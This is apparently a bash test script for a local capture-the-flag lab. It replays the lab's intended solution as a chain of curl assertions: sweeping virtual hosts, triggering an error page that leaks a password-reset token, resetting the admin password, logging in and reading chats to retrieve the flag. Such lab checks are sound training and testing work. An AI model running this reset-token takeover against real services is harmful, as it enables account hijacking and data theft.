#!/usr/bin/env bash
# c00 — the writeup end to end, as a solver would walk it.
set -uo pipefail
LAB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
ROOT="$(cd "$LAB_DIR/../.." && pwd)"
# shellcheck source=/dev/null
source "$ROOT/_shared/lib/check.sh"

PORT_HTTPS="${PORT_HTTPS:-18543}"
H="https://${LAB_HOST:-127.0.0.1}:${PORT_HTTPS}"
WORDS="$ROOT/_shared/data/vhost-labels.txt"
LABELS="$ROOT/_shared/data/vhost-labels.txt"

for _ in $(seq 1 90); do
  [[ "$(curl -sk -o /dev/null -w '%{http_code}' -H 'Host: chat-api.corp.lab' "$H/api/")" == "200" ]] && break
  sleep 1
done

echo "== c00 full chain =="

# 1. C1: the wall
assert_code "bare IP -> 404" 404 -k "$H/"
assert_header "bare IP Server" Server "Microsoft-HTTPAPI/2.0" -k "$H/"

# 2. C2: the certificate names the zone
assert_true "cert SAN carries *.corp.lab" bash -c \
  "openssl s_client -connect ${LAB_HOST:-127.0.0.1}:${PORT_HTTPS} -servername corp.lab </dev/null 2>/dev/null \
   | openssl x509 -noout -text | grep -q '\*\.corp\.lab'"

# 3. C3: find the host that serves robots.txt / the app
hit=""
while read -r w; do
  [[ -z "$w" ]] && continue
  if [[ "$(curl -sk -o /dev/null -w '%{http_code}' -H "Host: $w.corp.lab" "$H/robots.txt")" == "200" ]]; then
    hit="$w.corp.lab"; break
  fi
done < "$LABELS"
assert_eq "vhost sweep finds the site" "chatadmin.corp.lab" "$hit"

# 4. C4: the app root
assert_code "app root 200" 200 -k -H 'Host: chatadmin.corp.lab' "$H/chatadmin"
assert_body_has "app is the console" "Chat Admin" -k -H 'Host: chatadmin.corp.lab' "$H/chatadmin"

# 5. C5: the bundle points at the second vhost, with a different signature
BASE="$(curl -sk -H 'Host: chatadmin.corp.lab' "$H/chatadmin/assets/app.js" \
  | sed -n 's/.*API_BASE: *"\(https[^"]*\)".*/\1/p' | head -1)"
assert_eq "bundle API base" "https://chat-api.corp.lab/api" "$BASE"
assert_header "api vhost 404 signature" Server "Microsoft-IIS/10.0" -k -H 'Host: chat-api.corp.lab' "$H/nope"

# 6. C7: the 500 leaks the drafted reset mail
code="$(curl -sk -o /tmp/c00-500.html -w '%{http_code}' -H 'Host: chat-api.corp.lab' \
  -H 'Content-Type: application/json' -d '{"email":"admin@corp.lab"}' \
  "$H/api/auth/password_reset")"
assert_eq "reset -> 500" "500" "$code"
assert_file_has "traceback present" "Traceback" /tmp/c00-500.html
TOKEN="$(grep -oE 'token=[0-9a-f]{32}' /tmp/c00-500.html | head -1 | cut -d= -f2)"
assert_ne "token harvested" "" "$TOKEN"

NEWPASS="Chain-$(date +%s)-Aa1!"
assert_code "reset redeemed" 200 -k -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN\",\"password\":\"$NEWPASS\"}" "$H/api/auth/password_reset/confirm"
JWT="$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
  -d "{\"email\":\"admin@corp.lab\",\"password\":\"$NEWPASS\"}" "$H/api/auth/login" | jq -r '.token // empty')"
assert_ne "admin login" "" "$JWT"
curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $JWT" "$H/api/chats" -o /tmp/c00-chats.json
assert_file_has "flag via admin chats" "FLAG{" /tmp/c00-chats.json

# 7. C10: the keyword app is reachable on this same IP
assert_eq "keyword app answers" "200" \
  "$(curl -sk -o /dev/null -w '%{http_code}' -H 'Host: portal' "$H/")"
assert_header "keyword app identity" X-App "portal" -k -H 'Host: portal' "$H/"
assert_eq "trailing-dot gap" "404" \
  "$(curl -sk -o /dev/null -w '%{http_code}' -H 'Host: portal.' "$H/")"

# 8. decoys behave: identical roots, one 403 bait
assert_eq "decoy root identical to the real root" \
  "$(sha_of -k -H 'Host: vpn.corp.lab' "$H/")" "$(sha_of -k -H 'Host: chatadmin.corp.lab' "$H/")"
assert_eq "403 bait stays a 403" "403" \
  "$(curl -sk -o /dev/null -w '%{http_code}' -H 'Host: old-portal.corp.lab' "$H/")"

# 9. and the wall still holds for anything else
assert_code "unlisted host -> 404" 404 -k -H 'Host: whoami.corp.lab' "$H/"

summary
